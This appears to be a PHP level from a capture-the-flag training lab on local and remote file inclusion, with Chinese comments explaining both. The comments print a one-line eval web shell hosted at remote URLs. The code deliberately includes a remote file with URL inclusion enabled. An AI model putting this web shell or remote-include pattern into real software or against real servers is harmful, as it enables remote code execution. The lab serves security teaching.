<?php 
include("get_flag.php");
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-07-28 20:30
# @Repo:   github.com/ProbiusOfficial/PHPiclude-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - 文件包含基础靶场 关卡 12 : LFI&&RFI --- 

LFI - Local File Inclusion, 本地文件包含: 打开并包含本地文件的行为,比如我们后面会接触的日志文件包含，session文件包含，FilterChain等等。
本地文件包含是最常见的文件包含漏洞，在前面关卡中几乎所有的演示都是LFI（比如包含phpinfo.txt，backdoor.txt这样的行为）。
try ?wrappers=https://gitee.com/Probius/PHPinclude-labs/raw/main/RFI

RFI-  Remote File Inclusion,远程文件包含: 读取并执行远程服务器上文件的行为，相比于LFI，远程服务器上文件的可控性更高，因此危害更高，但代价就是条件苛刻，十分依赖 allow_url_include 参数。 HTTP/HTTPS 协议是最直观的远程文件包含形式，当然一定意义上，使用data协议去生成字符串然后包含也是一种远程文件包含。

该关卡配置:
allow_url_fopen:On
allow_url_include:On

相关文件：
- 远程链接(受中国大陆地区网络原因，该远程地址可能失效) https://raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI 中存有文本类型的一句话木马 <?php @eval($_POST['a']); ?>
- 远程链接(受不可预料的监管影响，该远程地址可能失效) https://gitee.com/Probius/PHPinclude-labs/raw/main/RFI 中存有文本类型的一句话木马 <?php @eval($_POST['a']); ?>

*/

/* hint:(need allow_url_fopen=On)如果 filename 是 "scheme://..." 的格式，则被当成一个 URL，PHP 将搜索协议处理器（也被称为封装协议）来处理此模式。(https://www.php.net/manual/zh/function.fopen.php) */

include('https://gitee.com/Probius/PHPinclude-labs/raw/main/RFI');

highlight_file(__FILE__);

?>

